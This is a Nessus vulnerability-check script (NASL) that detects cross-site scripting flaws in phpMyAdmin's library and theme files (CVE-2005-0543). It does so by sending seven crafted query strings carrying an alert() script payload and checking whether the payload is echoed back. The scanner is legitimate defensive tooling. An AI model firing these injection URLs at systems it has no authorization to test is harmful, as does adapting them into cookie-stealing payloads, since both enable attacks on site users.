#
# (C) Tenable Network Security
#


if (description) {
  script_id(17220);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-0543");
  script_bugtraq_id(12644);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"14096");
    script_xref(name:"OSVDB", value:"14097");
    script_xref(name:"OSVDB", value:"14098");
    script_xref(name:"OSVDB", value:"14099");
    script_xref(name:"OSVDB", value:"14100");
    script_xref(name:"OSVDB", value:"14101");
  }

  name["english"] = "Cross-Site Scripting Vulnerabilities in phpMyAdmin Libraries and Themes";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis : 

The remote web server contains a PHP application that is affected by
cross-site scripting vulnerabilities. 

Description :

The installed version of phpMyAdmin suffers from multiple cross-site
scripting vulnerabilities due to its failure to sanitize user input in
several PHP scripts used as libraries and themes.  A remote attacker
may use these issues to cause arbitrary code to be executed in a
user's browser, to steal authentication cookies and the like. 

See also :

http://marc.theaimsgroup.com/?l=bugtraq&m=110929725801154&w=2
http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2005-1

Solution :

Upgrade to phpMyAdmin 2.6.1 pl2 or later and disable PHP's
'register_globals' setting. 

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:H/Au:NR/C:P/A:N/I:N/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Detects cross-site scripting vulnerabilities in phpMyAdmin Libraries and Themes";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("phpMyAdmin_detect.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# A simple alert.
xss = string("<script>alert('", SCRIPT_NAME, "');</script>");
exss = urlencode(str:xss);

exploits = make_list(
  "/libraries/select_server.lib.php?cfg[Servers][cXIb8O3]=toja&cfg[Servers][sp3x]=toty&show_server_left=MyToMy&strServer=[" + exss + "]",
  "/libraries/select_server.lib.php?cfg[Servers][cXIb8O3]=toja&cfg[Servers][sp3x]=toty&cfg[BgcolorOne]=777777%22%3E%3CH1%3E[" + exss + "]",
  "/libraries/select_server.lib.php?cfg[Servers][cXIb8O3]=toja&cfg[Servers][sp3x]=toty&strServerChoice=%3CH1%3E" + exss,
  "/libraries/display_tbl_links.lib.php?doWriteModifyAt=left&del_url=Smutno&is_display[del_lnk]=Mi&bgcolor=%22%3E[" + exss + "]",
  "/libraries/display_tbl_links.lib.php?doWriteModifyAt=left&del_url=Smutno&is_display[del_lnk]=Mi&row_no=%22%3E[" + exss + "]",
  "/themes/original/css/theme_left.css.php?num_dbs=0&left_font_family=[" + exss + "]",
  "/themes/original/css/theme_right.css.php?right_font_family=[" + exss + "]"
);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  foreach exploit (exploits) {
    req = http_get(item:string(dir, exploit), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see our XSS.
    if (xss >< res) {
      security_note(port);
      exit(0);
    }

    # Only test all the exploits if thorough tests is enabled.
    if (!thorough_tests) break;
  }
}
